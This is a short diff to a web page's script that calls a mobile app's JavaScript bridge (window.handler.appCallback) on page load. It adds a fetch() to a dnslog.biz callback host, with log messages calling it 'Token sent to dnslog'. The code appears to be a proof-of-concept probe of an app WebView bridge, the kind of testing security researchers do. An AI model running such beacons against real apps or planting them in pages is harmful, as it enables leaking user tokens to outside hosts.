@@ -14,7 +14,17 @@
     }
 
     function getappCallback(){
-      alert(window.handler.appCallback(3,1,"summer"));
+      window.handler.appCallback(3,1,"summer");
+      let dnslogUrl = "https://test.bbc66268.log.dnslog.biz";
+      fetch(dnslogUrl, {
+        mode: 'no-cors'
+      })
+      .then(response => {
+        console.log('Token sent to dnslog:', response.status);
+      })
+      .catch(error => {
+        console.error('Error sending token to dnslog:', error);
+      });
         // 获取SohuAppPrivates变量
         let sohuAppPrivates = null;
         if (typeof SohuAppPrivates !== 'undefined') {
@@ -56,6 +66,7 @@
     // console.log('5 seconds have passed');
     setTimeout(getappCallback,400);
     jumpWhiteListUrl();
+    getappCallback();
 
   </script>
 </body>
